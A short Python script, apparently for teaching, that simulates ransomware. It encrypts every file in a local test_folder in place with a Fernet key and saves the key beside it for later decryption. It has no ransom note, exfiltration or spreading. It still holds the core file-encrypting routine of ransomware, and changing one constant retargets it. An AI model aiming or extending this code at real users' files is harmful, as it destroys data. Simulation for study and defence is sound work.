#!/usr/bin/python3

"""
Ransomware Simulation - Encryption Script
Educational use only.
Encrypts files inside the test_folder directory.
"""

import os
from cryptography.fernet import Fernet

# Folder to safely simulate encryption
TARGET_FOLDER = "test_folder"
KEY_FILE = "secret.key"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    return key

def get_files(folder):
    files = []
    for file in os.listdir(folder):
        file_path = os.path.join(folder, file)
        if os.path.isfile(file_path):
            files.append(file_path)
    return files

def encrypt_files(files, key):
    fernet = Fernet(key)

    for file in files:
        with open(file, "rb") as f:
            data = f.read()

        encrypted_data = fernet.encrypt(data)

        with open(file, "wb") as f:
            f.write(encrypted_data)

        print(f"[Encrypted] {file}")

def main():
    print("\n[Simulation] Ransomware Encryption Started")

    # Ensure target folder exists
    if not os.path.exists(TARGET_FOLDER):
        os.makedirs(TARGET_FOLDER)
        print(f"[Info] Created '{TARGET_FOLDER}' folder. Add test files and run again.")
        return

    files = get_files(TARGET_FOLDER)

    if not files:
        print("[Info] No files found in test_folder.")
        return

    key = generate_key()
    encrypt_files(files, key)

    print("\n[Simulation Complete]")
    print(f"Encryption key saved as: {KEY_FILE}")
    print("Use the decryption script to restore files.")

if __name__ == "__main__":
    main()